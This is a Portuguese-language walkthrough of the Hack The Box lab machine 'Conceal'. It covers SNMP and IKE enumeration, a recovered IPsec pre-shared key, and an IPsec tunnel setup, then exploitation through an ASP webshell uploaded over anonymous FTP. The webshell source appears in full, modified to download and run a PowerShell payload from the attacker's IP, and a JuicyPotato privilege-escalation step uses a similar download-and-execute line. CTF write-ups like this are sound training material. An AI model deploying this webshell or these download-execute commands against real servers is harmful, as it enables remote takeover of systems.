Conceal
========================

# Enumeration

    sudo nmap_enum conceal.htb

Nada que ajudasse. Mas para confirmar eu executei novamente o comando:

    sudo nmap -sS -Pn conceal.htb

Nada de ajuda. Ate que tivemos a ideia de conduzir um scan de portas UDP:

    sudo nmap -sU -p 53,161,111,137,139,2049 -Pn conceal.htb

E descobrimos a porta 161 (SNMP) aberta. Obter informacoes a respeito do host alvo:

    sudo nmap -Pn -sU -sV -p 161 --script="snmp*" conceal.htb
    
![qownnotes-media-QgcvMe](../../../media/qownnotes-media-QgcvMe.png)

![qownnotes-media-cnzItG](../../../media/qownnotes-media-cnzItG.png)

    sudo nmap -Pn -sU -sV -p 161 --script="banner,(snmp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "udp_161_snmp-nmap.txt" 10.10.10.116
    
    ike-scan -M 10.10.10.116
    
    for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
    
    while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line 10.10.10.116) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
    
    snmpwalk -c public -v 1 10.10.10.116 | tee snmp_output.txt


Já encontramos um hash de senha

![qownnotes-media-oGAfWt](../../../media/qownnotes-media-oGAfWt.png)

    hashid 9C8B1A372B1878851BE2C097031B6E43

![qownnotes-media-PLVqfg](../../../media/qownnotes-media-PLVqfg.png)

    hash-identifier 9C8B1A372B1878851BE2C097031B6E43
    
![qownnotes-media-zdblZS](../../../media/qownnotes-media-zdblZS.png)

![qownnotes-media-XBloDY](../../../media/qownnotes-media-XBloDY.png)

    while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line 10.10.10.116) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < vpnIDs.txt

Nada disso funcionou até que achei uma ferramenta que me auxiliasse com isso:

    sudo vi /etc/ipsec.conf

Coloquei a seguinte configuração:

    conn conceal
        authby=secret
        auto=route
        keyexchange=ikev1
        ike=3des-sha1-modp1024
        left=10.10.14.4
        right=10.10.10.116
        type=transport
        esp=3des-sha1
        rightprotoport=tcp

Depois alimentei a senha em um outro arquivo:

    ─$ sudo tail /etc/ipsec.secrets                                                                                    
    # This file holds shared secrets or RSA private keys for authentication.
    
    # RSA private key for this host, authenticating it to any other host
    # which knows the public part.
            
         10.10.14.7 10.10.10.116 : PSK "Dudecake1!"  

Daqui em diante eu executei os seguintes comandos:

    sudo ipsec start
    
    sudo ipsec up conceal
    
![qownnotes-media-fxREGq](../../../media/qownnotes-media-fxREGq.png)

Ainda se tratando de enumeração, tive que constatar um detalhe importante... O scan só funciona com TCP scan (-sT), caso contrário as portas não são dentifcadas como abertas... assim como no cenário de proxies também...

![qownnotes-media-lNjwGX](../../../media/qownnotes-media-lNjwGX.png)

![qownnotes-media-DSHAuU](../../../media/qownnotes-media-DSHAuU.png)

# Exploitation

Cara, depois disso foi tranquiilo achar o vetor de ataque... Vejam os passos:

    sudo nmap -sT -sC -T5 -sV -Pn 10.10.10.116 | tee nmap_output2.txt

Com isso descubrimos duas coisas... Temos um acesso via usuário anonymous com FTP e na web temos um diretório no quall esses arquivos que subimos pelo FTP se encontram... ficou triivial

![qownnotes-media-MEPrRE](../../../media/qownnotes-media-MEPrRE.png)

    ftp -a 10.10.10.116

![qownnotes-media-BFUPbm](../../../media/qownnotes-media-BFUPbm.png)

    gobuster dir -u http://10.10.10.116 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_gobuster.txt"
    
![qownnotes-media-MZjaWD](../../../media/qownnotes-media-MZjaWD.png)

    ftp -a 10.10.10.116
    mkdir test

![qownnotes-media-OSlWqk](../../../media/qownnotes-media-OSlWqk.png)

    firefox http://conceall.htb/upload/test
    
Notei que o diretório que criei iestava lá.. Subi algumas web shells lá, no entanto não funcionaram:

![qownnotes-media-okwnmm](../../../media/qownnotes-media-okwnmm.png)

Nenhuma dessas no print funcionaram... Então fui atrás de uma que funcionasse:

<https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp>

Alterei o payload:

    <!--
    ASP Webshell
    Working on latest IIS 
    Referance :- 
    https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp
    http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script
    http://www.w3schools.com/asp/
    -->
    
    
    <%
    Set oScript = Server.CreateObject("WSCRIPT.SHELL")
    Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
    Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
    Function getCommandOutput(theCommand)
        Dim objShell, objCmdExec
        Set objShell = CreateObject("WScript.Shell")
        ###########################################
        ## AQUI EU ALTEREI                        #
        ###########################################
        <!--Set objCmdExec = objshell.exec(thecommand)-->
        Set objCmdExec = objshell.exec("cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.4/shell.ps1')")
        getCommandOutput = objCmdExec.StdOut.ReadAll
    end Function
    %>
    
    
    <HTML>
    <BODY>
    <FORM action="" method="GET">
    <input type="text" name="cmd" size=45 value="<%= szCMD %>">
    <input type="submit" value="Run">
    </FORM>
    <PRE>
    <%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
    <%Response.Write(Request.ServerVariables("server_name"))%>
    <p>
    <b>The server's port:</b>
    <%Response.Write(Request.ServerVariables("server_port"))%>
    </p>
    <p>
    <b>The server's software:</b>
    <%Response.Write(Request.ServerVariables("server_software"))%>
    </p>
    <p>
    <b>The server's local address:</b>
    <%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
    <% szCMD = request("cmd")
    thisDir = getCommandOutput("cmd /c" & szCMD)
    Response.Write(thisDir)%>
    </p>
    <br>
    </BODY>
    </HTML>

salvei como web.asp e mandei para o servidor:

    ftp -a 10.10.10.116
    put web.asp
    
Preparei o kali para receber as conexões:

    python -m http.server 80
    
    nc -nlvp 8081
    
 ![qownnotes-media-hrqqcU](../../../media/qownnotes-media-hrqqcU.png)

![qownnotes-media-ZQCLyq](../../../media/qownnotes-media-ZQCLyq.png)

# Privilege Escalation

Na máquina da vítima

    copy \\10.10.14.4\smb\shell.bat shell.bat
    type shell.bat
    powershell -c iex (new-object net.webclient).downloadstring('http://10.10.14.4/shell2.ps1')
    
Aqui tive que trocar o CLSID

    ./jp.exe -t * -p shell.bat -l 4444 -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}" 

![qownnotes-media-VvbFSu](../../../media/qownnotes-media-VvbFSu.png)

![qownnotes-media-hbwSbX](../../../media/qownnotes-media-hbwSbX.png)
